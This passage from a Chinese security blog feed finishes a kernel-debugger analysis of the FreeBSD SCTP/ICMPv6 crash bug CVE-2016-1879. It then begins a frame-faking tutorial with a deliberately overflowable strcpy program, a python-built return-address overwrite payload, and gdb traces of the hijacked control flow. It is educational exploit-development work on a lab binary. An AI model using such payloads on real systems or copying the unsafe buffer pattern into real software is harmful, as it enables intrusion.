<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">sctp6_ctlinput</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">struct</span> sockaddr *pktdst, <span class="keyword">void</span> *d)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> sctphdr sh;</span><br><span class="line">	<span class="keyword">struct</span> ip6ctlparam *ip6cp = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">uint32_t</span> vrf_id;</span><br><span class="line"></span><br><span class="line">	vrf_id = SCTP_DEFAULT_VRFID;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pktdst-&gt;sa_family != AF_INET6 ||</span><br><span class="line">	    pktdst-&gt;sa_len != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in6))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span>)cmd &gt;= PRC_NCMDS)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="keyword">if</span> (PRC_IS_REDIRECT(cmd)) &#123;</span><br><span class="line">		d = <span class="literal">NULL</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (inet6ctlerrmap[cmd] == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* if the parameter is from icmp6, decode it. */</span></span><br><span class="line">	<span class="keyword">if</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		ip6cp = (<span class="keyword">struct</span> ip6ctlparam *)d;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		ip6cp = (<span class="keyword">struct</span> ip6ctlparam *)<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ip6cp) &#123;</span><br><span class="line">		<span class="comment">/*</span><br><span class="line">		 * <span class="doctag">XXX:</span> We assume that when IPV6 is non NULL, M and OFF are</span><br><span class="line">		 * valid.</span><br><span class="line">		 */</span></span><br><span class="line">		<span class="comment">/* check if we can safely examine src and dst ports */</span></span><br><span class="line">		<span class="keyword">struct</span> sctp_inpcb *inp = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sctp_tcb *stcb = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sctp_nets *net = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">struct</span> sockaddr_in6 final;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ip6cp-&gt;ip6c_m == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">		bzero(&amp;sh, <span class="keyword">sizeof</span>(sh));</span><br><span class="line">		bzero(&amp;final, <span class="keyword">sizeof</span>(final));</span><br><span class="line">		inp = <span class="literal">NULL</span>;</span><br><span class="line">		net = <span class="literal">NULL</span>;</span><br><span class="line">		m_copydata(ip6cp-&gt;ip6c_m, ip6cp-&gt;ip6c_off, <span class="keyword">sizeof</span>(sh),</span><br><span class="line">		    (<span class="keyword">caddr_t</span>)&amp;sh);</span><br><span class="line">		</span><br><span class="line">      	...</span><br><span class="line">        后面不重要</span><br></pre></td></tr></table></figure>
<p>​    我们可以通过代码 <strong>ip6cp = (struct ip6ctlparam *)d;</strong> 得知，ip6cp就是传入的参数d做了一次类型转换。</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) p *(struct ip6ctlparam *)d</span><br><span class="line"><span class="variable">$1</span> = &#123;ip6c_m = <span class="number">0xfffff80002a61d00</span>, ip6c_icmp6 = <span class="number">0xfffff80002b10038</span>, ip6c_ip6 = <span class="number">0xfffff80002b10040</span>, ip6c_off = <span class="number">88</span>, ip6c_src = <span class="number">0xfffffe00003fd510</span>, ip6c_dst = <span class="number">0xfffffe00003fd540</span>, </span><br><span class="line">  ip6c_finaldst = <span class="number">0xfffff80002b10058</span>, ip6c_cmdarg = <span class="number">0x10000000</span>, ip6c_nxt = <span class="number">132</span> <span class="string">'\204'</span>&#125;</span><br></pre></td></tr></table></figure>
<p>​    我们可以得到ip6cp的数据。m_copydata函数的第一个参数m就是这里的ip6c_m = 0xfffff80002a61d00，数据结构为<strong>struct mbuf</strong>。</p>
<p>​    另外一个要注意的是<strong>ip6c_off = 88</strong>。</p>
<p>​    </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(kgdb) p *(<span class="keyword">struct</span> mbuf *)<span class="number">0xfffff80002a61d00</span></span><br><span class="line">$<span class="number">2</span> = &#123;m_hdr = &#123;mh_next = <span class="number">0x0</span>, mh_nextpkt = <span class="number">0x0</span>, mh_data = <span class="number">0xfffff80002b10010</span> <span class="string">"`"</span>, mh_len = <span class="number">88</span>, mh_type = <span class="number">1</span>, mh_flags = <span class="number">3</span>&#125;, M_dat = &#123;MH = &#123;MH_pkthdr = &#123;rcvif = <span class="number">0xfffff800023d7800</span>, tags = &#123;</span><br><span class="line">          slh_first = <span class="number">0xfffff80002a5c900</span>&#125;, len = <span class="number">88</span>, flowid = <span class="number">0</span>, csum_flags = <span class="number">0</span>, fibnum = <span class="number">0</span>, cosqos = <span class="number">0</span> <span class="string">'\0'</span>, rsstype = <span class="number">0</span> <span class="string">'\0'</span>, l2hlen = <span class="number">0</span> <span class="string">'\0'</span>, l3hlen = <span class="number">0</span> <span class="string">'\0'</span>, l4hlen = <span class="number">0</span> <span class="string">'\0'</span>, </span><br><span class="line">        l5hlen = <span class="number">0</span> <span class="string">'\0'</span>, PH_per = &#123;eigth = <span class="string">"\000\000\000\000\000\000\000"</span>, sixteen = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, thirtytwo = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, sixtyfour = &#123;<span class="number">0</span>&#125;, unintptr = &#123;<span class="number">0</span>&#125;, ptr = <span class="number">0x0</span>&#125;, PH_loc = &#123;</span><br><span class="line">          eigth = <span class="string">"\000\000\000\000\000\000\000"</span>, sixteen = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, thirtytwo = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, sixtyfour = &#123;<span class="number">0</span>&#125;, unintptr = &#123;<span class="number">0</span>&#125;, ptr = <span class="number">0x0</span>&#125;&#125;, MH_dat = &#123;MH_ext = &#123;ref_cnt = <span class="number">0xfffff80002affb50</span>, </span><br><span class="line">          ext_buf = <span class="number">0xfffff80002b10000</span> <span class="string">""</span>, ext_size = <span class="number">2048</span>, ext_type = <span class="number">6</span>, ext_flags = <span class="number">0</span>, ext_free = <span class="number">0</span>, ext_arg1 = <span class="number">0x0</span>, ext_arg2 = <span class="number">0x0</span>&#125;, </span><br><span class="line">        MH_databuf = <span class="string">"P?\002\000???\000\000?\002\000???\000\b\000\000\006"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">146</span> times&gt;&#125;&#125;, </span><br><span class="line">    M_databuf = <span class="string">"\000x=\002\000???\000ɥ\002\000???X"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">39</span> times&gt;, <span class="string">"P?\002\000???\000\000?\002\000???\000\b\000\000\006"</span>, <span class="string">'\0'</span> &lt;repeats <span class="number">146</span> times&gt;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>​    可以看到mh_next=0x0,果然next是null。</p>
<p>​    同时可以看到处理的网络包的len是<strong>88</strong>。我回过头去数了一下抓到的网络包的字节数，除去以太网数据帧的头部信息之外，刚好就是88个字节。</p>
<h1 id="0x05崩溃原因">0x05崩溃原因</h1><p>​    1.根据协议发送的网络包告知系统ICMPv6中包含一个SCTP网络包。但是网络包的PAYLOAD是空的。</p>
<p>​    2.SCTP网络包解析函数 <strong>sctp6_ctlinput</strong> <strong>默认</strong>函数调用者传递来的网络包都是正确的网络包。所以并没有检测参数是否正常，而直接获取数据进行解析。</p>
<p>​    3.前面的包头都已经被分析完成。off与m-&gt;m_len都为88。</p>
<p>​    4.在<strong>m_copydata</strong>调用时,因为并没有payload，所以只用了一个mbuf。mbuf-&gt;next的值为NULL。</p>
<p>​    导致触发了断言，内核崩溃。</p>
<h1 id="0x06后记">0x06后记</h1><p>​    有两点程序开发时的要点需要牢记，在这个bug的分析中，再次体现了他们的重要性。</p>
<p>​    1. 不要默认调用者传递的参数是正确的，要做好异常处理。</p>
<p>​    2. 多用ASSERT，让程序越早崩溃越好。</p>
<h1 id="0x07_参考&amp;感谢">0x07 参考&amp;感谢</h1><p>​    感谢分享：）。</p>
<ol>
<li><p>[FreeBSD Remote DoS Exploit (Demo) (CVE-2016-1879) </p>
<p>(<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html" target="_blank" rel="external">http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html</a>)</p>
</li>
<li><p>freebsd下保存内核崩溃时的信息</p>
<p> (<a href="http://www.jiancool.com/article/479627865/" target="_blank" rel="external">http://www.jiancool.com/article/479627865/</a>)</p>
</li>
<li><p>Enable root Login On FreeBSD 10 </p>
<p>(<a href="http://www.unixmen.com/enable-root-login-ssh-freebsd-10/" target="_blank" rel="external">http://www.unixmen.com/enable-root-login-ssh-freebsd-10/</a>)</p>
</li>
<li><p>icmpv6协议</p>
<p>(<a href="https://zh.wikipedia.org/wiki/ICMPv6" target="_blank" rel="external">https://zh.wikipedia.org/wiki/ICMPv6</a>)</p>
<p>​</p>
</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_漏洞介绍">0x00 漏洞介绍</h1><p>​    <a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html">CVE-2016-1879</a>是一个会导致freebsd内核崩溃的一个漏洞。漏洞的具体细节看<a href="http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html">这里</a>。</p>]]>
    
    </summary>
    
      <category term="dos" scheme="http://yoursite.com/tags/dos/"/>
    
      <category term="freebsd" scheme="http://yoursite.com/tags/freebsd/"/>
    
      <category term="CVE" scheme="http://yoursite.com/categories/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[frame-faking-介绍-函数调用伪造]]></title>
    <link href="http://yoursite.com/2016/01/27/frame-faking/"/>
    <id>http://yoursite.com/2016/01/27/frame-faking/</id>
    <published>2016-01-27T16:02:32.000Z</published>
    <updated>2016-03-24T03:35:58.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_frame-faking"><strong>0x00</strong>  frame-faking</h1><p>在处理<a href="https://exploit-exercises.com/fusion/" target="_blank" rel="external">fusion</a>的<a href="https://exploit-exercises.com/fusion/level02/" target="_blank" rel="external">level02</a>时遇到新的问题，需要了解frame-faking的原理，查阅了一些资料。</p>
<p><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">The advanced return-into-lib(c) exploits</a></p>
<p><a href="http://www.xfocus.net/articles/200602/851.html" target="_blank" rel="external">Advanced Exploit Techique之–frame faking技术</a></p>
<p><a href="http://www.slideshare.net/hackstuff/rop-40525248" target="_blank" rel="external">ROP轻松谈</a></p>
<p>首先感谢各位前辈写的文章。</p>
<p>Frame Faking是一种栈溢出的技巧，使用framefaking可以通过控制ebp修改程序的运行流程，可以用来对抗DEP。</p>
<h2 id="<!-more->"><a id="more"></a></h2><h1 id="0x01_经典的ret2lib溢出"><strong>0x01</strong> 经典的ret2lib溢出</h1><h2 id="溢出流程">溢出流程</h2><p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> *a)</span></span>&#123;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">            <span class="built_in">strcpy</span>(buf,a);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"buf is: %s\n"</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">t</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">            n=<span class="number">0</span>;</span><br><span class="line">            n=n+<span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"n is : %d\n"</span>,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    test(argv[<span class="number">1</span>]);</span><br><span class="line">    t(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector test.c -o test</span><br></pre></td></tr></table></figure>
<p>通过构建payload使得test会调用t,并且设置返回地址。如图：</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/faking-frame_classic_ret2lib.png" alt="栈内存图"></p>
<p>下面我着重分析一下<strong>为什么可以控制调用后函数的返回地址</strong>，因为在加深对汇编代码栈上数据的管理。有利于更好地理解frame faking。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Starting program: /tmp/<span class="keyword">test</span> $(python -c <span class="string">'print "A"*268+"\x4b\x84\x04\x08"+"CCCC"+"\x40\xf5\xff\xbf"'</span>)</span><br><span class="line">buf is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKCCCC@???</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">2</span>, <span class="number">0x08048449</span> <span class="keyword">in</span> <span class="keyword">test</span> ()</span><br><span class="line">(gdb) disas <span class="keyword">test</span></span><br><span class="line">Dump of assembler code for function <span class="keyword">test</span>:</span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   %<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">esp</span>,%<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">sub</span>    <span class="number">$0</span>x118,%<span class="literal">esp</span></span><br><span class="line">   <span class="number">0x0804841d</span> &lt;+<span class="number">9</span>&gt;:	<span class="keyword">mov</span>    <span class="number">0x8</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048424</span> &lt;+<span class="number">16</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x0804842a</span> &lt;+<span class="number">22</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x0804842d</span> &lt;+<span class="number">25</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048330</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">30</span>&gt;:	<span class="keyword">mov</span>    <span class="number">$0</span>x8048570,%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048437</span> &lt;+<span class="number">35</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">edx</span></span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">edx</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048444</span> &lt;+<span class="number">48</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">=&gt; <span class="number">0x08048449</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span>  </span><br><span class="line">   <span class="number">0x0804844a</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span>    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff530</span>	<span class="number">0xbffff530</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0xbffff648</span>	<span class="number">0xbffff648</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span class="number">0x8048449</span>	<span class="number">0x8048449</span> &lt;<span class="keyword">test</span>+<span class="number">53</span>&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
<p>在汇编代码执行到leave的时候，esp与ebp分别指向栈顶和栈低。</p>
<p>leave指令相当于. </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp	；<span class="comment">//esp=ebp=0xbffff648。</span></span><br><span class="line">pop ebp ；<span class="comment">//ebp=[esp],esp=esp+4。</span></span><br></pre></td></tr></table></figure>
<p>所以在执行完leave指令之后，esp=0xbffff64c,ebp=0x41414141。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x0804844a</span> <span class="keyword">in</span> <span class="keyword">test</span> ()</span><br><span class="line">(gdb) disassemble <span class="keyword">test</span></span><br><span class="line">Dump of assembler code for function <span class="keyword">test</span>:</span><br><span class="line">   <span class="number">0x08048414</span> &lt;+<span class="number">0</span>&gt;:	<span class="keyword">push</span>   %<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048415</span> &lt;+<span class="number">1</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">esp</span>,%<span class="literal">ebp</span></span><br><span class="line">   <span class="number">0x08048417</span> &lt;+<span class="number">3</span>&gt;:	<span class="keyword">sub</span>    <span class="number">$0</span>x118,%<span class="literal">esp</span></span><br><span class="line">   <span class="number">0x0804841d</span> &lt;+<span class="number">9</span>&gt;:	<span class="keyword">mov</span>    <span class="number">0x8</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048420</span> &lt;+<span class="number">12</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048424</span> &lt;+<span class="number">16</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x0804842a</span> &lt;+<span class="number">22</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x0804842d</span> &lt;+<span class="number">25</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048330</span> &lt;strcpy@plt&gt;</span><br><span class="line">   <span class="number">0x08048432</span> &lt;+<span class="number">30</span>&gt;:	<span class="keyword">mov</span>    <span class="number">$0</span>x8048570,%<span class="literal">eax</span></span><br><span class="line">   <span class="number">0x08048437</span> &lt;+<span class="number">35</span>&gt;:	<span class="keyword">lea</span>    -<span class="number">0x108</span>(%<span class="literal">ebp</span>),%<span class="literal">edx</span></span><br><span class="line">   <span class="number">0x0804843d</span> &lt;+<span class="number">41</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">edx</span>,<span class="number">0x4</span>(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048441</span> &lt;+<span class="number">45</span>&gt;:	<span class="keyword">mov</span>    %<span class="literal">eax</span>,(%<span class="literal">esp</span>)</span><br><span class="line">   <span class="number">0x08048444</span> &lt;+<span class="number">48</span>&gt;:	<span class="keyword">call</span>   <span class="number">0x8048320</span> &lt;printf@plt&gt;</span><br><span class="line">   <span class="number">0x08048449</span> &lt;+<span class="number">53</span>&gt;:	<span class="keyword">leave</span>  </span><br><span class="line">=&gt; <span class="number">0x0804844a</span> &lt;+<span class="number">54</span>&gt;:	<span class="keyword">ret</span>    </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) i r</span><br><span class="line"><span class="literal">eax</span>            <span class="number">0x121</span>	<span class="number">289</span></span><br><span class="line"><span class="literal">ecx</span>            <span class="number">0xbffff51c</span>	-<span class="number">1073744612</span></span><br><span class="line"><span class="literal">edx</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">ebx</span>            <span class="number">0xb7fceff4</span>	-<span class="number">1208160268</span></span><br><span class="line"><span class="literal">esp</span>            <span class="number">0xbffff64c</span>	<span class="number">0xbffff64c</span></span><br><span class="line"><span class="literal">ebp</span>            <span class="number">0x41414141</span>	<span class="number">0x41414141</span></span><br><span class="line"><span class="literal">esi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">edi</span>            <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">eip</span>            <span class="number">0x804844a</span>		<span class="number">0x804844a</span> &lt;<span class="keyword">test</span>+<span class="number">54</span>&gt;</span><br><span class="line">eflags         <span class="number">0x296</span>	[ PF AF SF IF ]</span><br><span class="line"><span class="literal">cs</span>             <span class="number">0x73</span>	<span class="number">115</span></span><br><span class="line"><span class="literal">ss</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">ds</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">es</span>             <span class="number">0x7b</span>	<span class="number">123</span></span><br><span class="line"><span class="literal">fs</span>             <span class="number">0x0</span>	<span class="number">0</span></span><br><span class="line"><span class="literal">gs</span>             <span class="number">0x33</span>	<span class="number">51</span></span><br></pre></td></tr></table></figure>
<p>可以看到确实与我们计算的相同。此时需要执行指令ret。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret ;<span class="comment">//pop esi,等同于eip=[esp],esp=esp+4</span></span><br></pre></td></tr></table></figure>
<p>通过查看esp寄存器地址的数据，发现eip将被赋值为<strong>0x0804844b</strong>。正是<strong>t函数的地址</strong>。且esp的值将变成0xbffff650,而0xbfffff650的值是我们写入的”CCCC”。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /<span class="number">10</span>x $esp</span><br><span class="line"><span class="number">0xbffff64c</span>:	<span class="number">0x0804844b</span>	<span class="number">0x43434343</span>	<span class="number">0xbffff540</span>	<span class="number">0xb7e89b00</span></span><br><span class="line"><span class="number">0xbffff65c</span>:	<span class="number">0xb7fcf324</span>	<span class="number">0xb7fceff4</span>	<span class="number">0xb7e89c55</span>	<span class="number">0x080484a9</span></span><br><span class="line"><span class="number">0xbffff66c</span>:	<span class="number">0xb7fceff4</span>	<span class="number">0x080484a0</span></span><br></pre></td></tr></table></figure>
